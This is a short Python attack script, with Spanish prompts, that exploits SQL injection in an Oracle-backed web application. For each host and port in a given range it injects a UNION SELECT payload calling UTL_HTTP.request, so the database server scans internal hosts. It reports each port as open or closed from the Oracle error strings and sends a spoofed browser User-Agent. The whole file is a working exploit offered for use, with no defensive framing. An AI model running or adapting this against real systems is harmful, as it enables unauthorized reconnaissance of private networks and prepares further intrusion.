import urllib.request
import urllib.parse
import sys

if len(sys.argv) < 8:
    print ("Introduce los siguientes parámetros: <start host> <end host> <start port> <end port> <timeout> <url> <method>")
    sys.exit(0)
else:
    start_host = sys.argv[1]
    end_host   = sys.argv[2]
    start_port = int(sys.argv[3])
    end_port   = int(sys.argv[4])
    timeout    = int(sys.argv[5])
    url        = sys.argv[6]
    method     = sys.argv[7]

user_agent = "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))"
headers = {'User-Agent' : user_agent }

# Convertir las direcciones IP a números para iterar sobre ellas
start_host_num = list(map(int, start_host.split('.')))
end_host_num = list(map(int, end_host.split('.')))

for i in range(start_host_num[3], end_host_num[3] + 1):
    host = '.'.join(map(str, start_host_num[:3] + [i]))
    for port in range(start_port, end_port + 1):
        query = "' UNION SELECT NULL,UTL_HTTP.request('" + host + ":" + str(port) + "'),NULL,NULL from dual--"
        url_query = url + urllib.parse.quote(query)
        req = urllib.request.Request(url_query,None,headers)
        try:
            if method.lower() == 'get':
                res = urllib.request.urlopen(req,None,timeout)
            elif method.lower() == 'post':
                res = urllib.request.urlopen(req,None,timeout)
            else:
                print("Método no soportado: " + method)
                sys.exit(0)
            response = res.read().decode('utf-8')
            if 'ORA-12541: TNS:no listener' in response or 'TNS:operation timed out' in response:
                print ("Host: " + host + " Port: " + str(port) + " CLOSED")
            elif 'ORA-29263: HTTP protocol error' in response:
                print ("Host: " + host + " Port: " + str(port) + " OPEN")
            elif 'destination host unreachable' in response:
                print ("Host: " + host + " UNREACHABLE")
            else:
                print ("Host: " + host + " Port: " + str(port) + " UNKNOWN RESPONSE")
        except Exception as e:
            print ("Host: " + host + " Port: " + str(port) + " CLOSED/NOT REACHED")
            print ("Exception: ", e)

